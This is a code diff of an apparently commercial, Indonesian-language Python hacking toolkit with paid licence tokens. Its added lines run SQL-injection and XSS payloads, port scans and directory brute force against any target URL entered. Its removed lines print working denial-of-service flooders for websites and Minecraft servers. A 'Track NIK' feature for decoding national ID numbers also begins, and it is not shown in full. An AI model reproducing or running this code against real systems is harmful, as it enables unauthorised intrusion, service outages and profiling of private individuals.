-        print(colored(f"Key: {key.decode()}", 'yellow'))
+            key = Fernet.generate_key()
+            cipher = Fernet(key)
+            
+            if os.path.exists(data):
+                with open(data, 'rb') as f:
+                    file_data = f.read()
+                encrypted = cipher.encrypt(file_data)
+                enc_file = f"encrypted_{os.path.basename(data)}"
+                with open(enc_file, 'wb') as f:
+                    f.write(encrypted)
+                print(colored(f"[✓] File terenkripsi: {enc_file}", 'green'))
+            else:
+                encrypted = cipher.encrypt(data.encode())
+                enc_file = f"encrypted_{int(time.time())}.txt"
+                with open(enc_file, 'w') as f:
+                    f.write(encrypted.decode())
+                print(colored(f"[✓] Text terenkripsi: {enc_file}", 'green'))
+            
+            key_file = f"key_{int(time.time())}.key"
+            with open(key_file, 'wb') as f:
+                f.write(key)
+            print(colored(f"[✓] Key disimpan: {key_file}", 'green'))
+            print(colored(f"Key: {key.decode()}", 'yellow'))
     
     elif choice == "2":
-        enc_file = input(colored("Encrypted file path: ", 'yellow')).strip()
-        key_file = input(colored("Key file path: ", 'yellow')).strip()
+        enc_file = input("Encrypted file: ").strip()
+        key_file = input("Key file: ").strip()
         
-        with open(key_file, 'rb') as f:
-            key = f.read()
-        cipher = Fernet(key)
-        
-        with open(enc_file, 'rb') as f:
-            encrypted = f.read()
-        decrypted = cipher.decrypt(encrypted)
-        
-        dec_file = f"decrypted_{os.path.basename(enc_file)}"
-        with open(dec_file, 'wb') as f:
-            f.write(decrypted)
-        
-        print(colored(f"\n[DECRYPTED] File: {dec_file}", 'green'))
+        if not os.path.exists(enc_file):
+            print(colored("[ERROR] File encrypted tidak ditemukan", 'red'))
+        elif not os.path.exists(key_file):
+            print(colored("[ERROR] File key tidak ditemukan", 'red'))
+        else:
+            try:
+                with open(key_file, 'rb') as f:
+                    key = f.read()
+                cipher = Fernet(key)
+                
+                with open(enc_file, 'rb') as f:
+                    encrypted = f.read()
+                decrypted = cipher.decrypt(encrypted)
+                
+                dec_file = f"decrypted_{os.path.basename(enc_file)}"
+                with open(dec_file, 'wb') as f:
+                    f.write(decrypted)
+                print(colored(f"[✓] File didekripsi: {dec_file}", 'green'))
+            except Exception as e:
+                print(colored(f"[ERROR] Gagal dekripsi: {str(e)}", 'red'))
     
     elif choice == "3":
         key = Fernet.generate_key()
         key_file = f"generated_key_{int(time.time())}.key"
         with open(key_file, 'wb') as f:
             f.write(key)
-        print(colored(f"\n[KEY GENERATED] Saved: {key_file}", 'green'))
+        print(colored(f"[✓] Key: {key_file}", 'green'))
         print(colored(f"Key: {key.decode()}", 'yellow'))
     
     elif choice == "4":
-        text = input(colored("Text to hash: ", 'yellow')).strip()
-        hash_type = input(colored("Hash type (md5/sha1/sha256): ", 'yellow')).strip().lower()
-        
-        import hashlib
-        if hash_type == "md5":
-            result = hashlib.md5(text.encode()).hexdigest()
-        elif hash_type == "sha1":
-            result = hashlib.sha1(text.encode()).hexdigest()
+        text = input("Text to hash: ").strip()
+        if not text:
+            print(colored("[ERROR] Text tidak boleh kosong", 'red'))
         else:
-            result = hashlib.sha256(text.encode()).hexdigest()
-        
-        print(colored(f"\n[HASH] {hash_type}: {result}", 'green'))
+            print("\nPilih algoritma:")
+            print("1. MD5")
+            print("2. SHA1")
+            print("3. SHA256")
+            print("4. SHA512")
+            
+            algo = input("Pilih [1-4]: ").strip()
+            
+            if algo == "1":
+                result = hashlib.md5(text.encode()).hexdigest()
+                print(colored(f"\n[MD5] {result}", 'green'))
+            elif algo == "2":
+                result = hashlib.sha1(text.encode()).hexdigest()
+                print(colored(f"\n[SHA1] {result}", 'green'))
+            elif algo == "3":
+                result = hashlib.sha256(text.encode()).hexdigest()
+                print(colored(f"\n[SHA256] {result}", 'green'))
+            elif algo == "4":
+                result = hashlib.sha512(text.encode()).hexdigest()
+                print(colored(f"\n[SHA512] {result}", 'green'))
+            else:
+                print(colored("[ERROR] Pilihan tidak valid", 'red'))
     
     elif choice == "5":
-        text = input(colored("Text to encode/decode: ", 'yellow')).strip()
-        op_type = input(colored("Encode or Decode? (e/d): ", 'yellow')).strip().lower()
-        
-        if op_type == 'e':
-            result = base64.b64encode(text.encode()).decode()
-            print(colored(f"\n[ENCODED] Base64: {result}", 'green'))
+        text = input("Text: ").strip()
+        if not text:
+            print(colored("[ERROR] Text tidak boleh kosong", 'red'))
         else:
-            try:
-                result = base64.b64decode(text).decode()
-                print(colored(f"\n[DECODED] Text: {result}", 'green'))
-            except:
-                print(colored("[ERROR] Invalid Base64!", 'red'))
+            op = input("Encode or Decode? (e/d): ").strip().lower()
+            
+            if op == 'e':
+                result = base64.b64encode(text.encode()).decode()
+                print(colored(f"\n[ENCODED] {result}", 'green'))
+            elif op == 'd':
+                try:
+                    result = base64.b64decode(text).decode()
+                    print(colored(f"\n[DECODED] {result}", 'green'))
+                except Exception as e:
+                    print(colored(f"[ERROR] Invalid Base64: {str(e)}", 'red'))
+            else:
+                print(colored("[ERROR] Pilihan tidak valid", 'red'))
     
-    save_result("crypto.log", f"Operation: {crypto_ops[choice][0] if choice in crypto_ops else 'Unknown'}")
+    save_result("crypto.log", f"Operation: {choice}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 8: EXPLOIT & SECURITY ==================
-def fitur_8():
+# ================== FITUR 7: EXPLOIT & SCANNER ==================
+def fitur_7():
     os.system('clear')
-    print(colored("\n[8] EXPLOIT & SECURITY", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Generate Scanner Script]", 'yellow'))
+    print(colored("\n[7] EXPLOIT & SCANNER", 'cyan', attrs=['bold']))
+    print(colored("   [VULNERABILITY SCANNER]", 'yellow'))
     
     target = input(colored("Target URL/IP: ", 'yellow')).strip()
     
-    print(colored("\nPilih tipe scan:", 'cyan'))
-    scan_types = {
-        "1": ("Port Scanner", "port"),
-        "2": ("SQL Injection Scanner", "sqli"),
-        "3": ("XSS Scanner", "xss"),
-        "4": ("Directory Brute Force", "dirb"),
-        "5": ("CMS Detector", "cms")
-    }
-    
-    for key, (name, stype) in scan_types.items():
-        print(colored(f"   {key}. {name}", 'white'))
-    
-    choice = input(colored("\nPilih scan [1-5]: ", 'yellow')).strip()
-    
-    if choice not in scan_types:
-        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
+    if not target:
+        print(colored("[ERROR] Target tidak boleh kosong", 'red'))
         input("\nEnter...")
         return
     
-    # Generate scanner script
+    print(colored("\nPilih tipe scan:", 'cyan'))
+    print("1. Port Scanner")
+    print("2. SQL Injection Scanner")
+    print("3. XSS Scanner")
+    print("4. Directory Brute Force")
+    print("5. CMS Detector")
+    
+    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
+    
     if choice == "1":  # Port scanner
-        script = f'''import socket
-import threading
-
-target = "{target}"
-ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080]
-
-def scan_port(port):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(1)
-        result = sock.connect_ex((target, port))
-        if result == 0:
-            print(f"[OPEN] Port {{port}}")
-        sock.close()
-    except:
-        pass
-
-print(f"Scanning {{target}}...")
-for port in ports:
-    thread = threading.Thread(target=scan_port, args=(port,))
-    thread.start()
-'''
+        print(colored(f"\n[SCAN PORT] {target}", 'cyan'))
+        print(colored("Scanning port umum...", 'yellow'))
+        
+        # Common ports
+        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
+        open_ports = []
+        
+        def scan_port(port):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((target, port))
+                if result == 0:
+                    # Get service name
+                    try:
+                        service = socket.getservbyport(port)
+                    except:
+                        service = "unknown"
+                    print(colored(f"[✓] Port {port} OPEN - {service}", 'green'))
+                    open_ports.append((port, service))
+                sock.close()
+            except:
+                pass
+        
+        threads = []
+        for port in ports:
+            t = threading.Thread(target=scan_port, args=(port,))
+            t.start()
+            threads.append(t)
+            time.sleep(0.05)  # Prevent overwhelming
+        
+        for t in threads:
+            t.join()
+        
+        if not open_ports:
+            print(colored("[✗] Tidak ada port terbuka yang ditemukan", 'yellow'))
+        else:
+            print(colored(f"\n[✓] Ditemukan {len(open_ports)} port terbuka", 'green'))
+    
     elif choice == "2":  # SQLi scanner
-        script = f'''import requests
-
-target = "{target}"
-payloads = ["'", "''", "' OR '1'='1", "' OR 1=1--", "admin' --"]
-
-for payload in payloads:
-    try:
-        r = requests.get(target + "?id=" + payload, timeout=5)
-        if "mysql" in r.text.lower() or "sql" in r.text.lower():
-            print(f"[VULN] Possible SQLi with payload: {{payload}}")
-    except:
-        pass
-'''
+        print(colored(f"\n[SCAN SQLi] {target}", 'cyan'))
+        
+        # Test parameters
+        test_params = ['id', 'page', 'cat', 'product', 'user', 'username']
+        
+        # SQL injection payloads
+        payloads = [
+            "'",
+            "''",
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "admin' --",
+            "1' AND '1'='1",
+            "1' AND 1=1--",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT 1,2,3--"
+        ]
+        
+        print(colored("Menguji parameter umum...", 'yellow'))
+        
+        for param in test_params:
+            test_url = f"{target}?{param}=test"
+            try:
+                r = requests.get(test_url, timeout=3)
+                original_length = len(r.text)
+                
+                for payload in payloads:
+                    test_url = f"{target}?{param}={payload}"
+                    try:
+                        r = requests.get(test_url, timeout=3)
+                        current_length = len(r.text)
+                        
+                        # Check for SQL errors
+                        if any(err in r.text.lower() for err in ['mysql', 'sql', 'syntax', 'odbc', 'driver']):
+                            print(colored(f"[!] Potensi SQLi di parameter {param} dengan payload: {payload}", 'red'))
+                            print(colored(f"    Error SQL terdeteksi", 'yellow'))
+                            break
+                        
+                        # Check for length difference
+                        if abs(current_length - original_length) > 100:
+                            print(colored(f"[?] Anomali di parameter {param} dengan payload: {payload}", 'yellow'))
+                            print(colored(f"    Perbedaan panjang: {abs(current_length - original_length)}", 'yellow'))
+                            
+                    except:
+                        pass
+            except:
+                pass
+    
     elif choice == "3":  # XSS scanner
-        script = f'''import requests
-
-target = "{target}"
-payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
-
-for payload in payloads:
-    try:
-        r = requests.get(target + "?q=" + payload, timeout=5)
-        if payload in r.text:
-            print(f"[VULN] Possible XSS with payload: {{payload}}")
-    except:
-        pass
-'''
+        print(colored(f"\n[SCAN XSS] {target}", 'cyan'))
+        
+        test_params = ['q', 's', 'search', 'query', 'keyword']
+        payloads = [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "\"><script>alert(1)</script>",
+            "'><img src=x onerror=alert(1)>"
+        ]
+        
+        for param in test_params:
+            for payload in payloads:
+                test_url = f"{target}?{param}={payload}"
+                try:
+                    r = requests.get(test_url, timeout=3)
+                    if payload in r.text:
+                        print(colored(f"[!] XSS DITEMUKAN di parameter {param}", 'red'))
+                        print(colored(f"    Payload: {payload}", 'yellow'))
+                        break
+                except:
+                    pass
+    
     elif choice == "4":  # Directory brute force
-        script = f'''import requests
-
-target = "{target}"
-directories = ["admin", "login", "wp-admin", "backup", "config", "sql", "phpmyadmin"]
-
-for dir in directories:
-    try:
-        r = requests.get(target + "/" + dir, timeout=5)
-        if r.status_code == 200:
-            print(f"[FOUND] {{target}}/{{dir}}")
-    except:
-        pass
-'''
-    else:  # CMS detector
-        script = f'''import requests
-
-target = "{target}"
-cms_signatures = {{
-    "wordpress": ["wp-content", "wp-includes"],
-    "joomla": ["joomla", "com_content"],
-    "drupal": ["sites/all", "drupal.js"],
-    "magento": ["skin/frontend", "Mage.Cookies"]
-}}
-
-try:
-    r = requests.get(target, timeout=5)
-    content = r.text.lower()
+        print(colored(f"\n[DIRECTORY BRUTE FORCE] {target}", 'cyan'))
+        
+        common_dirs = [
+            'admin', 'login', 'wp-admin', 'administrator', 'backup', 'config',
+            'sql', 'phpmyadmin', 'mysql', 'db', 'database', 'files', 'uploads',
+            'images', 'css', 'js', 'vendor', 'api', 'v1', 'v2', 'rest', 'graphql'
+        ]
+        
+        found = []
+        
+        for directory in common_dirs:
+            try:
+                url = f"{target.rstrip('/')}/{directory}"
+                r = requests.get(url, timeout=2)
+                if r.status_code == 200:
+                    print(colored(f"[✓] FOUND: {url}", 'green'))
+                    found.append(url)
+                elif r.status_code == 403:
+                    print(colored(f"[!] FORBIDDEN: {url}", 'yellow'))
+                    found.append(f"{url} (403)")
+                elif r.status_code == 301 or r.status_code == 302:
+                    print(colored(f"[→] REDIRECT: {url} -> {r.headers.get('Location', '?')}", 'cyan'))
+                    found.append(f"{url} (redirect)")
+            except:
+                pass
+        
+        if not found:
+            print(colored("[✗] Tidak ada direktori yang ditemukan", 'yellow'))
     
-    for cms, sigs in cms_signatures.items():
-        for sig in sigs:
-            if sig in content:
-                print(f"[CMS] Detected: {{cms}} (signature: {{sig}})")
-                break
-except:
-    print("Error connecting to target")
-'''
+    elif choice == "5":  # CMS detector
+        print(colored(f"\n[CMS DETECTOR] {target}", 'cyan'))
+        
+        cms_signatures = {
+            "WordPress": [
+                "wp-content", "wp-includes", "wp-json", "xmlrpc.php",
+                "WordPress", "wp-admin"
+            ],
+            "Joomla": [
+                "joomla", "com_content", "com_users", "Joomla!",
+                "/media/jui/", "/media/system/"
+            ],
+            "Drupal": [
+                "sites/all", "drupal.js", "Drupal.settings", "drupal.org",
+                "core/misc/drupal.js"
+            ],
+            "Magento": [
+                "skin/frontend", "Mage.Cookies", "Magento", "js/mage",
+                "checkout/cart"
+            ],
+            "Laravel": [
+                "laravel", "Laravel", "_token", "csrf"
+            ],
+            "CodeIgniter": [
+                "ci_session", "CodeIgniter"
+            ]
+        }
+        
+        try:
+            r = requests.get(target, timeout=5)
+            content = r.text.lower()
+            headers = r.headers
+            
+            detected = []
+            
+            # Check content
+            for cms, signatures in cms_signatures.items():
+                for sig in signatures:
+                    if sig.lower() in content:
+                        print(colored(f"[✓] Detected {cms} (signature: {sig})", 'green'))
+                        detected.append(cms)
+                        break
+            
+            # Check headers
+            server = headers.get('Server', '')
+            if 'nginx' in server.lower():
+                print(colored(f"[✓] Web Server: Nginx", 'cyan'))
+            elif 'apache' in server.lower():
+                print(colored(f"[✓] Web Server: Apache", 'cyan'))
+            elif 'iis' in server.lower():
+                print(colored(f"[✓] Web Server: IIS", 'cyan'))
+            
+            if not detected:
+                print(colored("[✗] CMS tidak terdeteksi", 'yellow'))
+                
+        except Exception as e:
+            print(colored(f"[✗] Gagal mengakses target: {str(e)[:30]}", 'red'))
     
-    filename = f"scanner_{scan_types[choice][1]}_{int(time.time())}.py"
-    with open(filename, "w") as f:
-        f.write(script)
-    
-    print(colored(f"\n[SCANNER SCRIPT GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   File: {filename}", 'cyan'))
-    print(colored(f"   Target: {target}", 'cyan'))
-    print(colored(f"   Tipe: {scan_types[choice][0]}", 'cyan'))
-    print(colored("\n[INFO] Jalankan script dengan: python " + filename, 'yellow'))
-    
-    save_result("exploit.log", f"Target: {target} | Scan: {scan_types[choice][0]}")
+    save_result("exploit.log", f"Target: {target} | Scan: {choice}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 9: WHATSAPP INVITE ==================
-def fitur_9():
+# ================== FITUR 8: WHATSAPP INVITE ==================
+def fitur_8():
     os.system('clear')
-    print(colored("\n[9] WHATSAPP INVITE TOOLS", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - Group Invite Generator]", 'yellow'))
+    print(colored("\n[8] WHATSAPP INVITE", 'cyan', attrs=['bold']))
+    print(colored("   [GENERATE LINK WA]", 'yellow'))
     
-    phone = input(colored("Nomor HP target (628xxx): ", 'yellow')).strip()
+    phone = input(colored("Nomor target (628xxx): ", 'yellow')).strip()
+    
+    # Validasi nomor
+    if not phone.startswith('62') or len(phone) < 10:
+        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
+        input("\nEnter...")
+        return
     
     print(colored("\nPilih metode:", 'cyan'))
-    methods = {
-        "1": ("Direct Chat Link", "chat"),
-        "2": ("Group Invite Link", "group"),
-        "3": ("WhatsApp Business Link", "business"),
-        "4": ("Broadcast Link", "broadcast")
-    }
+    print("1. Direct Chat Link")
+    print("2. Group Invite Link (generate random)")
+    print("3. WhatsApp Business Link")
+    print("4. Broadcast Link")
     
-    for key, (name, mtype) in methods.items():
-        print(colored(f"   {key}. {name}", 'white'))
-    
-    choice = input(colored("\nPilih metode [1-4]: ", 'yellow')).strip()
+    choice = input(colored("\nPilih [1-4]: ", 'yellow')).strip()
     
     if choice == "1":
         link = f"https://wa.me/{phone}"
-        message = input(colored("Pesan default (opsional): ", 'yellow')).strip()
+        message = input("Pesan (opsional): ").strip()
         if message:
-            import urllib.parse
             link += f"?text={urllib.parse.quote(message)}"
+        print(colored(f"\n[LINK] {link}", 'green'))
+        
     elif choice == "2":
         group_code = ''.join(random.choices(string.ascii_letters + string.digits, k=22))
         link = f"https://chat.whatsapp.com/{group_code}"
+        print(colored(f"\n[GROUP LINK] {link}", 'green'))
+        print(colored("[!] Ini adalah link random, bukan group real", 'yellow'))
+        
     elif choice == "3":
         link = f"https://wa.me/{phone}?business=true"
+        print(colored(f"\n[BUSINESS LINK] {link}", 'green'))
+        
     elif choice == "4":
-        link = f"https://web.whatsapp.com/send/?phone={phone}&text&type=phone_number&app_absent=0"
+        link = f"https://web.whatsapp.com/send/?phone={phone}"
+        print(colored(f"\n[BROADCAST LINK] {link}", 'green'))
+        
     else:
-        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
+        print(colored("[ERROR] Invalid!", 'red'))
         input("\nEnter...")
         return
     
-    print(colored(f"\n[LINK GENERATED]", 'green', attrs=['bold']))
-    print(colored(f"   {link}", 'cyan'))
-    
     # QR Code option
-    qr_choice = input(colored("\nGenerate QR Code? (y/n): ", 'yellow')).lower()
+    qr_choice = input("\nBuat QR Code? (y/n): ").lower()
     if qr_choice == 'y':
         try:
             import qrcode
             qr = qrcode.make(link)
             qr_file = f"wa_qr_{int(time.time())}.png"
             qr.save(qr_file)
-            print(colored(f"[QR CODE] Saved: {qr_file}", 'green'))
+            print(colored(f"[✓] QR: {qr_file}", 'green'))
         except ImportError:
-            print(colored("[INFO] Install QR Code: pip install qrcode[pil]", 'yellow'))
+            print(colored("[!] Install qrcode: pip install qrcode[pil]", 'yellow'))
     
-    save_result("whatsapp.log", f"Target: {phone} | Method: {methods[choice][0] if choice in methods else 'Unknown'} | Link: {link}")
+    save_result("whatsapp.log", f"Target: {phone} | Link: {link}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 10: DASHBOARD MONITORING ==================
-def fitur_10():
+# ================== FITUR 9: DASHBOARD ==================
+def fitur_9():
     os.system('clear')
-    print(colored("\n[10] DASHBOARD MONITORING", 'cyan', attrs=['bold']))
-    print(colored("   [LOCAL MODE - System Statistics]", 'yellow'))
+    print(colored("\n[9] DASHBOARD", 'cyan', attrs=['bold']))
+    print(colored("   [STATISTIK SISTEM]", 'yellow'))
     
-    # System info
-    print(colored("\n[SISTEM INFORMASI]", 'magenta'))
+    print(colored("\n[SISTEM]", 'magenta'))
     print(colored(f"   OS: {os.name}", 'white'))
-    print(colored(f"   CPU Count: {os.cpu_count()}", 'white'))
+    print(colored(f"   CPU: {os.cpu_count()} core", 'white'))
+    print(colored(f"   User: {WHOAMI}", 'white'))
+    print(colored(f"   Waktu: {CURRENT_TIME}", 'white'))
     
-    # Tool statistics
-    print(colored("\n[STATISTIK TOOLS]", 'magenta'))
+    print(colored("\n[STATISTIK]", 'magenta'))
     
-    # Count saved logs
-    log_files = [f for f in os.listdir(RESULTS_DIR) if f.endswith('.log')] if os.path.exists(RESULTS_DIR) else []
-    log_counts = {}
-    for log in log_files:
-        try:
-            with open(os.path.join(RESULTS_DIR, log), 'r') as f:
-                log_counts[log] = len(f.readlines())
-        except:
-            log_counts[log] = 0
-    
-    total_operations = sum(log_counts.values())
-    print(colored(f"   Total operasi: {total_operations}", 'white'))
-    print(colored(f"   File log: {len(log_files)}", 'white'))
-    
-    for log, count in log_counts.items():
-        print(colored(f"      - {log}: {count} entries", 'cyan'))
+    # Count results
+    if os.path.exists(RESULTS_DIR):
+        files = os.listdir(RESULTS_DIR)
+        log_files = [f for f in files if f.endswith('.log')]
+        json_files = [f for f in files if f.endswith('.json')]
+        txt_files = [f for f in files if f.endswith('.txt')]
+        
+        total_ops = 0
+        
+        print(colored(f"   Total file: {len(files)}", 'cyan'))
+        print(colored(f"   - Log files: {len(log_files)}", 'cyan'))
+        print(colored(f"   - JSON files: {len(json_files)}", 'cyan'))
+        print(colored(f"   - Text files: {len(txt_files)}", 'cyan'))
+        
+        # Hitung total operasi dari log
+        for log in log_files:
+            try:
+                with open(os.path.join(RESULTS_DIR, log), 'r') as f:
+                    count = len(f.readlines())
+                    total_ops += count
+                    print(colored(f"   {log}: {count} entries", 'white'))
+            except:
+                pass
+        
+        print(colored(f"\n   TOTAL OPERASI: {total_ops}", 'green'))
+    else:
+        print(colored("   Belum ada data", 'yellow'))
     
     # Token stats
     tokens = load_tokens()
-    print(colored(f"\n[TOKEN STATISTIK]", 'magenta'))
+    print(colored(f"\n[TOKEN]", 'magenta'))
     print(colored(f"   Total user: {len(tokens)}", 'white'))
     
-    active_users = sum(1 for user in tokens.values() if user.get('active', False))
-    print(colored(f"   Active: {active_users}", 'green'))
-    print(colored(f"   Expired: {len(tokens) - active_users}", 'red'))
+    active = sum(1 for user in tokens.values() if user.get('active', False))
+    expired = len(tokens) - active
+    print(colored(f"   Active: {active}", 'green'))
+    print(colored(f"   Expired: {expired}", 'red'))
     
-    # Recent activities
-    print(colored("\n[AKTIVITAS TERAKHIR]", 'magenta'))
-    recent_logs = []
+    # Recent files
+    print(colored(f"\n[FILE TERBARU]", 'magenta'))
     if os.path.exists(RESULTS_DIR):
-        for log in sorted(os.listdir(RESULTS_DIR), key=lambda x: os.path.getmtime(os.path.join(RESULTS_DIR, x)), reverse=True)[:5]:
-            if log.endswith('.log'):
-                recent_logs.append(f"{log} - {datetime.fromtimestamp(os.path.getmtime(os.path.join(RESULTS_DIR, log))).strftime('%H:%M:%S')}")
+        recent_files = sorted([f for f in os.listdir(RESULTS_DIR)], 
+                             key=lambda x: os.path.getmtime(os.path.join(RESULTS_DIR, x)), 
+                             reverse=True)[:5]
+        for f in recent_files:
+            mtime = datetime.fromtimestamp(os.path.getmtime(os.path.join(RESULTS_DIR, f)))
+            print(colored(f"   {f} - {mtime.strftime('%H:%M:%S')}", 'cyan'))
     
-    if recent_logs:
-        for log in recent_logs:
-            print(colored(f"   {log}", 'cyan'))
-    else:
-        print(colored("   No recent activity", 'yellow'))
-    
-    save_result("dashboard.log", f"Dashboard accessed at {datetime.now().isoformat()}")
+    save_result("dashboard.log", f"Dashboard accessed at {datetime.now()}")
     input("\nPress Enter to continue...")
 
-# ================== FITUR 11: DEVTOOLS ==================
-def fitur_11():
+# ================== FITUR 10: DEVTOOLS ==================
+def fitur_10():
     if not IS_DEVELOPER:
-        print(colored("[ERROR] Fitur hanya untuk developer!", 'red'))
+        print(colored("[ERROR] Hanya untuk developer!", 'red'))
         input("\nEnter...")
         return
     
     os.system('clear')
-    print(colored("\n[11] DEVTOOLS", 'cyan', attrs=['bold']))
-    print(colored("   [DEVELOPER MODE - Advanced Tools]", 'yellow'))
+    print(colored("\n[10] DEVTOOLS", 'cyan', attrs=['bold']))
     
-    print(colored("\nPilih tool:", 'cyan'))
-    dev_tools = {
-        "1": ("View Raw tokens.json", "view_raw"),
-        "2": ("Backup Database", "backup"),
-        "3": ("Restore Database", "restore"),
-        "4": ("Clear All Logs", "clear_logs"),
-        "5": ("Generate Test Users", "test_users")
-    }
+    print(colored("\nPilih:", 'cyan'))
+    print("1. View tokens.json")
+    print("2. Backup Database")
+    print("3. Restore Database")
+    print("4. Clear All Logs")
+    print("5. Generate Test Users")
     
-    for key, (name, dtool) in dev_tools.items():
-        print(colored(f"   {key}. {name}", 'white'))
-    
-    choice = input(colored("\nPilih tool [1-5]: ", 'yellow')).strip()
+    choice = input(colored("\nPilih [1-5]: ", 'yellow')).strip()
     
     if choice == "1":
         tokens = load_tokens()
-        print(colored("\n[RAW tokens.json]", 'magenta'))
         print(json.dumps(tokens, indent=2))
     
     elif choice == "2":
@@ -1538,368 +2001,973 @@ def fitur_11():
             with open(LICENSE_FILE, 'r') as f:
                 with open(backup_file, 'w') as bf:
                     bf.write(f.read())
-            print(colored(f"\n[BACKUP] Saved: {backup_file}", 'green'))
+            print(colored(f"[✓] Backup: {backup_file}", 'green'))
     
     elif choice == "3":
-        backup_files = [f for f in os.listdir() if f.startswith('backup_tokens_') and f.endswith('.json')]
-        if backup_files:
-            print(colored("\nAvailable backups:", 'cyan'))
-            for i, bf in enumerate(backup_files, 1):
-                print(colored(f"   {i}. {bf}", 'white'))
-            b_choice = input(colored("Pilih backup: ", 'yellow')).strip()
+        backups = [f for f in os.listdir() if f.startswith('backup_tokens_') and f.endswith('.json')]
+        if backups:
+            print("\nAvailable backups:")
+            for i, bf in enumerate(backups, 1):
+                size = os.path.getsize(bf)
+                print(f"{i}. {bf} ({size} bytes)")
+            
             try:
-                selected = backup_files[int(b_choice)-1]
-                with open(selected, 'r') as f:
-                    data = f.read()
-                with open(LICENSE_FILE, 'w') as lf:
-                    lf.write(data)
-                print(colored("[RESTORE] Database restored!", 'green'))
-            except:
-                print(colored("[ERROR] Invalid choice!", 'red'))
+                idx = int(input("Pilih nomor: ")) - 1
+                if 0 <= idx < len(backups):
+                    with open(backups[idx], 'r') as f:
+                        data = f.read()
+                    with open(LICENSE_FILE, 'w') as lf:
+                        lf.write(data)
+                    print(colored("[✓] Database restored!", 'green'))
+                else:
+                    print(colored("[ERROR] Nomor tidak valid", 'red'))
+            except ValueError:
+                print(colored("[ERROR] Masukkan angka", 'red'))
         else:
-            print(colored("No backups found!", 'yellow'))
+            print("No backups found")
     
     elif choice == "4":
-        confirm = input(colored("Hapus semua log? (y/n): ", 'yellow')).lower()
+        confirm = input("Hapus semua log di results/? (y/n): ").lower()
         if confirm == 'y' and os.path.exists(RESULTS_DIR):
+            count = 0
             for f in os.listdir(RESULTS_DIR):
                 os.remove(os.path.join(RESULTS_DIR, f))
-            print(colored("[LOGS CLEARED]", 'green'))
+                count += 1
+            print(colored(f"[✓] {count} file log dihapus", 'green'))
     
     elif choice == "5":
-        count = int(input(colored("Jumlah test users: ", 'yellow')).strip() or "5")
-        tokens = load_tokens()
-        for i in range(count):
-            username = f"TEST_USER_{i+1}"
-            token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-            tokens[username] = {
-                'username': username,
-                'token': token,
-                'whoami': f"test_whoami_{i+1}",
-                'plan': random.choice(["pemula 1hari", "pemula 1minggu", "pro 1bulan"]),
-                'active': True,
-                'created': datetime.now().isoformat(),
-                'expires': (datetime.now() + timedelta(days=random.choice([1,7,30]))).isoformat()
-            }
-        save_tokens(tokens)
-        print(colored(f"[GENERATED] {count} test users created!", 'green'))
+        try:
+            count = int(input("Jumlah test users: ") or "5")
+            tokens = load_tokens()
+            for i in range(count):
+                username = f"TEST_USER_{i+1}_{random.randint(100,999)}"
+                token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+                tokens[username] = {
+                    'username': username,
+                    'token': token,
+                    'whoami': f"test_whoami_{i+1}",
+                    'plan': random.choice(["pemula 1hari", "pemula 1minggu", "pro 1bulan"]),
+                    'active': True,
+                    'created': datetime.now().isoformat(),
+                    'expires': (datetime.now() + timedelta(days=random.choice([1,7,30]))).isoformat()
+                }
+            save_tokens(tokens)
+            print(colored(f"[✓] {count} test users created", 'green'))
+        except ValueError:
+            print(colored("[ERROR] Masukkan angka", 'red'))
     
-    input("\nPress Enter to continue...")
+    input("\nEnter...")
 
-# ================== FITUR 12: TOOLS DDOS WEBS ==================
-def fitur_12():
+# ================== FITUR 11: TRACK NIK ==================
+def fitur_11():
     os.system('clear')
-    print(colored("\n[12] TOOLS DDOS WEBS", 'cyan', attrs=['bold']))
-    print(colored("   [WEB STRESSER - LANGSUNG JALAN]", 'red'))
+    print(colored("\n[11] TRACK NIK", 'cyan', attrs=['bold']))
+    print(colored("   [DEKODE NOMOR INDUK KEPENDUDUKAN]", 'yellow'))
     
-    url = input(colored("Target URL: ", 'yellow')).strip()
-    threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
+    nik = input(colored("Masukkan NIK (16 digit): ", 'yellow')).strip()
     
-    def attack():
-        while True:
-            try:
-                requests.get(url)
-            except:
-                pass
-    
-    print(f"[+] Menyerang {url} dengan {threads} thread")
-    for _ in range(threads):
-        threading.Thread(target=attack).start()
-    input("\nEnter untuk berhenti...")
-
-# ================== FITUR 13: TOOLS DDOS SERVER MC ==================
-def fitur_13():
-    os.system('clear')
-    print(colored("\n[13] TOOLS DDOS SERVER MC", 'cyan', attrs=['bold']))
-    print(colored("   [MINECRAFT SERVER ATTACK]", 'red'))
-    
-    ip = input(colored("Server IP: ", 'yellow')).strip()
-    port = int(input(colored("Port [25565]: ", 'yellow')).strip() or "25565")
-    threads = int(input(colored("Threads [100]: ", 'yellow')).strip() or "100")
-    
-    def mc_attack():
-        while True:
-            try:
-                s = socket.socket()
-                s.connect((ip, port))
-                s.send(b"\x00" * 100)
-                s.close()
-            except:
-                pass
-    
-    print(f"[+] Menyerang {ip}:{port} dengan {threads} thread")
-    for _ in range(threads):
-        threading.Thread(target=mc_attack).start()
-    input("\nEnter untuk berhenti...")
-
-# ================== FITUR 14: TOOLS TRACKING NIK ==================
-def fitur_14():
